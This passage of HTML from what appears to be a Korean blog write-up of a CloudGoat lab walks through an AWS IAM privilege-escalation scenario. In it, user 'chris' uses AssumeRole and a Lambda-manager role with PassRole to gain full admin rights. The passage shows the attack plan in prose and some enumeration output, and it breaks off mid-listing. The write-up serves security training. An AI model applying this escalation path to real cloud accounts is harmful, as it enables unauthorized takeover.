3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>IAM User</li>\n<li>IAM Roles</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>IAM User Chris</li>\n<li>IAM USER: chris 에게 <code class=\"language-text\">sts:AssumeRole</code> 이 부여되어 있는 상황</li>\n<li>IAM Rule에는 Lambda 함수를 통해서 더 높은 권한을 갖일 수 있는 <code class=\"language-text\">iam:PassRole</code> 이 존재합니다.</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>Full-Privileges 획득</li>\n</ul>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADPUlEQVQoz21SXUxTZxh+I9BzvtIaS6DWft85bU+LtFQx/nAKPTUzKkIpgpWaVrEUWKJblmjUxIEjG5NFDf2xUPDnRqadum6TZPP/P/4s0zW7MGYm25JdeGHihXFq5LRF8pkjc1e7ePK+efO8T943zwOCYNNUOxc1VVfXLKaUguhu2uGSmn90Sd5TdR7ft42+jZmWdeFMS1s40+ANZkS3N+OSmk8rHLG+aaOyIwiVakIIIoSogON4ZLc7LVX2BQQAFMEDLqn5d5fkvVfn8WW9azuybe1d2db1kWyjL5QV3d6sS2q+r3BEd9Mno+OPQLDOL/1XkAGMMatGxcVlZboSc/VSNX1FYdfWQdjdOw67906AcsF7TFMKPTtOwM4vJuDjXUffzcwmEyK8hcXYOCNIMGY5nkdkngGVAKicAIwZAAFA0eLum9b2ockTPaNyOjwspyMjk+nNyclvOocn050jr4+HEvIPjQPPu/+hFOyiX4OxkQHCcazRoGd5+yLU2Jcs120e00ufpucpgr6Bp75AfOqRf6hwOxAr3F0fLfzsjxZ+UfpArHArEJ960HZAPgYAKqHSgXjBwYBloaRcU7yy/yqpP0J/7b9O//SfpE9qk/JHQZtFHYy97A2P5K91pfLnNiXzFzqG85c+HMuf6x7NXwkl5LSv/y+xvEzLmiw25XUG5tesUAPArFXbfrNG9v9Nx888pP1H/qCBgceDUNVXum7/q883JfM3Qonc5VAidzWYyF0PJnJXlOofkk817HnsqaioYHmTgDheYMBirmRnM8AsXRmfM7IzGkhs3d7xde/entiWr2zLP3u2JhCVfwrGc0e7xqYT4dSbg+HUm1QoOR2PjE6lNsTk71r3vY7OEVapeYOW5a1OBoxGI8ubbEinAWbGzTtA6QslQUUKIncoACzQFXsyfbj17JdzW87v062ZGATHoYa1Z2bc57CexYRDM6YQ8s5yzmRFUm196QfiEs1qd53G6ahRY8fq0vYVRgbVjVm1DWfjuO1iUt9yPlbuu3BYtfz7YKwWigSxU4uVDGL8Xw4ZJYv/B4INrIGrQsu0UMLuoeA5TsF5iELlEAV4RsFgrkHEqH/PRxhj1Vtb3i/5pUWvtgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"그룹 28.png\"\n        title=\"그룹 28.png\"\n        src=\"/static/c81092475e90825c5276ace925c8ffc8/37523/28.png\"\n        srcset=\"/static/c81092475e90825c5276ace925c8ffc8/e9ff0/28.png 180w,\n/static/c81092475e90825c5276ace925c8ffc8/f21e7/28.png 360w,\n/static/c81092475e90825c5276ace925c8ffc8/37523/28.png 720w,\n/static/c81092475e90825c5276ace925c8ffc8/302a4/28.png 1080w,\n/static/c81092475e90825c5276ace925c8ffc8/07a9c/28.png 1440w,\n/static/c81092475e90825c5276ace925c8ffc8/4435f/28.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환경설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환경설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABPklEQVQoz32RXW+CMBiFK6JzCgWkUMuHCgKK4OJXnNuSLdnF/v8/OkvfLV5M3cXJeWnap+cU5ogIXChYrgT3FYY8hOVNMHIlue0rjBwJN4wx5BKdrgvD9O6K6Y29gQ+zP75491f9R0FrhumiYzpgBr8A74FZ+/SKRblDuTyQF9WeXMVL8u3+Hcl0DT/IIVUFs+//m5KVyz3SWYNp1pJrzbINAaNkRbOGadlOfAX4C2d5sYVUJR1W8QpRWmMSVQTSa36QwfPnBOw9CDBmgxkOWMe5WZ8dT5+omxOazRl1+4x1e6ZvXXd3+MDL2xeq+ohydaBLhpbCyI5It+pTQp0kTutL0mTWgLsJLB5DhAtKJ8IcY5GBuyk8MadZJ74CapC+Wb+dfnw9T+ftz48IcwSyQCAXCCYFzRrUHwRU/VblbzyIxtjsEGgAAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"0\"\n        title=\"0\"\n        src=\"/static/31cc6f72d3919acf446b20806baa1334/37523/0.png\"\n        srcset=\"/static/31cc6f72d3919acf446b20806baa1334/e9ff0/0.png 180w,\n/static/31cc6f72d3919acf446b20806baa1334/f21e7/0.png 360w,\n/static/31cc6f72d3919acf446b20806baa1334/37523/0.png 720w,\n/static/31cc6f72d3919acf446b20806baa1334/681f1/0.png 899w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<ul>\n<li>IAM 사용자 “Chris”의 정보를 토대로 사용할 수 있는 권한을 분석합니다.</li>\n<li>AWS Credential 을 확인한 결과 lambdaManager로 모든 lambda 를 관리하고 전달할 Rule 권한이 있는 것을 확인하였고 debug Rule에 권한이 있는 것을 확인했습니다.</li>\n<li>공격자는 lambdaManager Rule을 활용하여 Lambda 함수를 사용하여 권한 상승을 수행합니다.</li>\n<li>공격자는 관리자 정책을 IAM 사용자 “Chris”에 연결할 수 있도록 합니다.</li>\n<li>공격자는 LambdaManager Rule을 이용하여 Lambda 함수를 생성하여 이를 지정한후 Lambda running을 Debug mode로 변경합니다.</li>\n<li>공격자는 LambdaManager Rule을 사용하여 Lambda 함수를 호출하여 관리자 정책이 “Chris” 사용자에게 연결도히어 Full-Privilege 를 획득합니다.</li>\n</ul>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"iam-user-chris-정보를-토대로-사용할-수-있는-권한-나열\" style=\"position:relative;\"><a href=\"#iam-user-chris-%EC%A0%95%EB%B3%B4%EB%A5%BC-%ED%86%A0%EB%8C%80%EB%A1%9C-%EC%82%AC%EC%9A%A9%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-%EA%B6%8C%ED%95%9C-%EB%82%98%EC%97%B4\" aria-label=\"iam user chris 정보를 토대로 사용할 수 있는 권한 나열 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IAM User: Chris 정보를 토대로 사용할 수 있는 권한 나열</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyElEQVQI1y3M0U6CUACA4VNupSacU0PgaJuEEHKMiSIBNTBS1tp6/9f5u6iL7/YTzfuZ9vRF216o+h/SeqDrBrqPb5q3MxtzIIpztoXGlBZpITGljTkq7h2PmfWIJZfcTlwmdx6iaj4pq57y9cShubBrBuq6Z5tVPK0z4mRPEGbolYsObPyVQgcSHSimM4ebsct46v6HPiJJC1JzxJiC9UvNYlOi/RDXD9HLCL2I8PyI0Dgke5t4J3nObZJcIR/miCuFGEnE9Z9f5iNUnm42NjcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/8edf254456f8d6c0471053e9cbf14c7a/37523/1.png\"\n        srcset=\"/static/8edf254456f8d6c0471053e9cbf14c7a/e9ff0/1.png 180w,\n/static/8edf254456f8d6c0471053e9cbf14c7a/f21e7/1.png 360w,\n/static/8edf254456f8d6c0471053e9cbf14c7a/37523/1.png 720w,\n/static/8edf254456f8d6c0471053e9cbf14c7a/302a4/1.png 1080w,\n/static/8edf254456f8d6c0471053e9cbf14c7a/4719e/1.png 1330w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBklEQVQY042RWW+CUBCFrwtqXJCCUFlaIxTZt0IBtTFt+v9/0zEzCX1qmz6czORm5sw3c8XhmMG0A+wMF8bex94K8Gj6MO0QphPCOSQc7aeIa5ZrEyvZgqI+cz5otbGwWBoQbf+FonpHlHSI0w5JdkZWXPHafKCqbwjjlgfSADKZzjRI8x0mksr5IGlOUYWgxjQ/4xQ23Hz0CgTRG7LigiBqoOkuxtMHCLGGGMkYTZQ/JYiCqPygZiP3pWRzovT8itckIjL9j0TTfiIvrwiTFlHawTtVTEpnSLIemn7EbKFzMRH8ZDK8i/EWoqxviLP+m5BWJsI0v7AhfZqsOHyz3wwHs83Wxh090ptQcN9ikwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"2\"\n        title=\"2\"\n        src=\"/static/b6d4484d944999fc544d66d0aedba00d/37523/2.png\"\n        srcset=\"/static/b6d4484d944999fc544d66d0aedba00d/e9ff0/2.png 180w,\n/static/b6d4484d944999fc544d66d0aedba00d/f21e7/2.png 360w,\n/static/b6d4484d944999fc544d66d0aedba00d/37523/2.png 720w,\n/static/b6d4484d944999fc544d66d0aedba00d/302a4/2.png 1080w,\n/static/b6d4484d944999fc544d66d0aedba00d/07a9c/2.png 1440w,\n/static/b6d4484d944999fc544d66d0aedba00d/5fc9a/2.png 1648w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>사용할 수 있는 권한들을 나열한 결과 lambda, rds, ec2등으로 분석을 진행하였고 몇가지 사용 가능한 권한들 중에서 <code class=\"language-text\">get-caller-identity</code> 권한을 이용하여 chris profile의 userid, account, arn을 확인였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">ofile chris\n<span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"UserId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AIDA2MALBVI56QS3BF452\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"Account\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"712987748923\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::712987748923:user/chris-lambda_privesc_cgidejvizwx9mo\"</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>chris의 Amazon AWS Resource Name(ARN) 고유한 리소스정보 에대해서 알 수 가 있기 때문에 해당 데이터를 통해 정확한 리소스를 구분이 가능합니다.</li>\n</ul>\n<h3 id=\"lambda-정책-과-관련된-기능-나열\" style=\"position:relative;\"><a href=\"#lambda-%EC%A0%95%EC%B1%85-%EA%B3%BC-%EA%B4%80%EB%A0%A8%EB%90%9C-%EA%B8%B0%EB%8A%A5-%EB%82%98%EC%97%B4\" aria-label=\"lambda 정책 과 관련된 기능 나열 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>lambda 정책 과 관련된 기능 나열</h3>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">User <span class=\"token string\">\"chris-lambda_privesc_cgidejvizwx9mo\"</span> has <span class=\"token number\">1</span> attached policies\nPolicy <span class=\"token string\">\"cg-chris-policy-lambda_privesc_cgidejvizwx9mo\"</span> <span class=\"token punctuation\">(</span>arn<span class=\"token punctuation\">:</span>aws<span class=\"token punctuation\">:</span>iam<span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token number\">712987748923</span><span class=\"token punctuation\">:</span>policy<span class=\"token operator\">/</span>cg<span class=\"token operator\">-</span>chris<span class=\"token operator\">-</span>policy<span class=\"token operator\">-</span>lambda_privesc_cgidejvizwx9mo<span class=\"token punctuation\">)</span>\nUser <span class=\"token string\">\"chris-lambda_privesc_cgidejvizwx9mo\"</span> has <span class=\"token number\">0</span> inline policies\nUser <span class=\"token string\">\"chris-lambda_privesc_cgidejvizwx9mo\"</span> has <span class=\"token number\">0</span> groups associated</code></pre></div>\n<ul>\n<li>lambda 기능에 대한 정책이 하나 attached 되어 있는 것을 확인할 수 있고 이에 대한 ARN정보또한 출력이 되는 것을 통해서 해당 권한에 대한 정보를 확인하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"AttachedPolicies\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"PolicyName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-chris-policy-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"PolicyArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::712987748923:policy/cg-chris-policy-lambda_privesc_cgidejvizwx9mo\"</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>앞에서 구한 ARN을 바탕으로 사용자가 생성한 해당 정책에 대해 자세히 알아야 합니다.</li>\n<li>사용자와 Attached된 정책을 열거하기 위해서 Policy ARN을 기반한 version 정보를 조회하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABB0lEQVQoz5WS2W6DMBREHZYsTcBsAQrBgMAYVBBtoqiq+v/fNZVvlLaP8DDSlWWdueMxu96+IdWMaf4kVfWAJK1RiA6i6pHlLRyewwsEgqiCF5Rw/QLcL2jmviD5YYVz0oDFaQuprsiLAUcnw/4lgWkHMG2fZFjLtTE9MGZwxKmEVDdy1E72LoI+1xfWSEOZYWmqQ7Ea+YHs0iOI6lWb/Rf7GziSV4m36Yvi69hP11VAyr1xKWZ4rknWNvyFrYWy3SGm9nRTJzcn2AP0eMNnMUvBzLRDdP0dohqpnCTr4PALHF7gcEzB2GnVtmyc7mjlBDW8o1Mz/UNRKjRyRNtNKKse2320eMMfpYTSLH0MndcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"3\"\n        title=\"3\"\n        src=\"/static/36851b622044de2eea7cd5b2c79458e8/37523/3.png\"\n        srcset=\"/static/36851b622044de2eea7cd5b2c79458e8/e9ff0/3.png 180w,\n/static/36851b622044de2eea7cd5b2c79458e8/f21e7/3.png 360w,\n/static/36851b622044de2eea7cd5b2c79458e8/37523/3.png 720w,\n/static/36851b622044de2eea7cd5b2c79458e8/302a4/3.png 1080w,\n/static/36851b622044de2eea7cd5b2c79458e8/f3a19/3.png 1086w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 version 정보를 통해서 <code class=\"language-text\">chris</code> 사용자는 <code class=\"language-text\">sts:AssumeRole</code> <code class=\"language-text\">iam:List</code> <code class=\"language-text\">iam:get</code> 에 대한 모든 자원과 권한에 대해 접근이 허용가능한것을 파악할 수 있습니다.</li>\n<li>chris 사용자의 허용가능한 roles에 대해 모두 나열을 하여 몇가지 중요한 정보들을 파악할 수 있습니다.</li>\n<li>elastic-load-balacing, rds, support, trustedadvisor, debug, lambda-manager 권한에 대한 Allow 상태입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"Roles\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/aws-service-role/elasticloadbalancing.amazonaws.com/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AWSServiceRoleForElasticLoadBalancing\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI57ZZNFYMTY\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::712987748923:role/aws-service-role/elasticloadbalancing.amazonaws.com/AWSServiceRoleForElasticLoadBalancing\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-14T04:51:17+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"Service\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"elasticloadbalancing.amazonaws.com\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allows ELB to call AWS services on your behalf.\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/aws-service-role/rds.amazonaws.com/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AWSServiceRoleForRDS\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI5TMWNAS337\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::712987748923:role/aws-service-role/rds.amazonaws.com/AWSServiceRoleForRDS\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-14T04:51:19+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token 